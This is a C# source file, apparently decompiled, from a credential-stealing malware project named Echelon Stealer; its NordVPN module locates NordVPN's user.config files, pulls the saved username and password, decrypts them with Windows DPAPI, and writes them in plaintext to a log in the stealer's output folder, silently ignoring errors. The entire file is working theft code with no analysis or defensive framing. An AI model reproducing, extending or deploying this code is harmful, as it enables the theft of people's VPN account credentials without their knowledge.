using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;
using Echelon.Global;

namespace Echelon.Stealer.VPN
{
	// Token: 0x02000011 RID: 17
	internal class NordVPN
	{
		// Token: 0x0600002A RID: 42 RVA: 0x00003A94 File Offset: 0x00001C94
		public static void GetNordVPN(string Echelon_Dir)
		{
			try
			{
				if (Directory.Exists(Help.LocalData + "\\NordVPN\\"))
				{
					Directory.CreateDirectory(Echelon_Dir + NordVPN.NordVPNDir);
					using (StreamWriter streamWriter = new StreamWriter(Echelon_Dir + NordVPN.NordVPNDir + "\\Account.log"))
					{
						DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Help.LocalData, "NordVPN"));
						if (directoryInfo.Exists)
						{
							DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
							for (int i = 0; i < directories.Length; i++)
							{
								foreach (DirectoryInfo directoryInfo2 in directories[i].GetDirectories())
								{
									streamWriter.WriteLine("\tFound version " + directoryInfo2.Name);
									string text = Path.Combine(directoryInfo2.FullName, "user.config");
									if (File.Exists(text))
									{
										XmlDocument xmlDocument = new XmlDocument();
										xmlDocument.Load(text);
										string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value").InnerText;
										string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value").InnerText;
										if (innerText != null && !string.IsNullOrEmpty(innerText))
										{
											streamWriter.WriteLine("\t\tUsername: " + NordVPN.Nord_Vpn_Decoder(innerText));
										}
										if (innerText2 != null && !string.IsNullOrEmpty(innerText2))
										{
											streamWriter.WriteLine("\t\tPassword: " + NordVPN.Nord_Vpn_Decoder(innerText2));
										}
										NordVPN.count++;
									}
								}
							}
						}
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x0600002B RID: 43 RVA: 0x00003C6C File Offset: 0x00001E6C
		public static string Nord_Vpn_Decoder(string s)
		{
			string result;
			try
			{
				result = Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), null, DataProtectionScope.LocalMachine));
			}
			catch
			{
				result = "";
			}
			return result;
		}

		// Token: 0x04000028 RID: 40
		public static int count;

		// Token: 0x04000029 RID: 41
		public static string NordVPNDir = "\\Vpn\\NordVPN";
	}
}
